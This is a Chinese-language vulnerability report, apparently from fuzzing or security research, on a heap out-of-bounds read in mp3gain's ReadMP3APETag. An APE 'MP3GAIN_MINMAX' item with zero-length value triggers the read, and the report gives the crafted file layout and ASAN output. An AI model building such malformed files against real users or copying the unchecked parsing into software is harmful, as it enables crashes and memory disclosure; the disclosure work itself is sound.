# VULN 002 — Heap OOB Read in MP3GAIN_MINMAX APE Field Parsing

## PoC 思路

APEv2 tag 解析函数 `ReadMP3APETag()`（apetag.c 第 207 行）在读取 item 时执行：

```c
value = (char*)malloc(vsize+1);   // vsize=0 -> malloc(1), 仅 1 字节
memcpy(value, p+isize+1, vsize);  // 复制 0 字节，无问题
value[vsize] = 0;                 // value[0]=0，无问题
```

当 `name == "MP3GAIN_MINMAX"` 时（第 243-253 行），代码不检查 vsize 直接读取：

```c
vp = value;                    // vp 指向 1 字节缓冲区
memcpy(tmpString, vp, 3);     // 读 3 字节 -> OOB +2 字节
vp = vp + 4;                  // vp 超出分配区域 4 字节
memcpy(tmpString, vp, 3);     // 读 3 字节 -> OOB +7 字节
```

## 文件结构

```
[417B 假 MPEG1 Layer3 帧] [23B APE item] [32B APE footer]
```

APE item 字段：
- `item_value_size = 0x00000000`（vsize=0，触发关键）
- `item_flags = 0x00000000`（UTF-8 文本类型）
- `item_key = "MP3GAIN_MINMAX\x00"`（15 字节）
- `item_value = ""`（空，0 字节）

APE footer：version=2000，size=55，count=1，flags=0（仅 footer）。

## 预期现象

ASAN 报告 `heap-buffer-overflow` READ，分配来源为 `ReadMP3APETag` 中的 `malloc(1)`，访问越界地址（1 字节区域右侧）。实际触发两次越界：
1. 第 247 行 `memcpy(tmpString, value, 3)` — 超出 1 字节分配 +2 字节
2. 第 251 行 `memcpy(tmpString, value+4, 3)` — 超出 1 字节分配 +7 字节

## 实际验证结果

ASAN 确认（asan.log.15195）：
```
ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000050
READ of size 4 at ... in ReadMP3APETag
1-byte region [0x502000000050,0x502000000051) allocated in ReadMP3APETag
```
调用链：`main -> ReadMP3GainAPETag -> ReadMP3APETag`
